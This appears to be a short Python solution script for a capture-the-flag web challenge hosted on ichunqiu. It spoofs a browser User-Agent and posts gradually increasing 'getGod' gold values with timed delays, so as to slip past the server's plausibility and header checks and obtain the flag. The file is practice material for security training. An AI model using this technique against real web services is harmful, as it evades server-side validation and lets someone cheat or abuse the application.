# --------------------------------------------------------------
# 本题服务器验证了每次post gold数量之间的合理性 此外对HTTP头有一定的检测
# 下面脚本通过模拟操作得到flag
# --------------------------------------------------------------

import requests
import time

s = requests.session()
s.headers[
    'User-Agent'] = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'
s.headers['Connection'] = 'closed'
s.headers['Content-Type'] = 'application/x-www-form-urlencoded; charset=UTF-8'

url = 'http://8888f9d3b1d54202ad332e7f68ca89a6cc663467d9924af8.game.ichunqiu.com/'

s.get(url)
for i in range(0, 1010, 5):
    time.sleep(0.2)
    r = s.post(url + 'index.php', data={'getGod': i})
    print(r.content.decode())
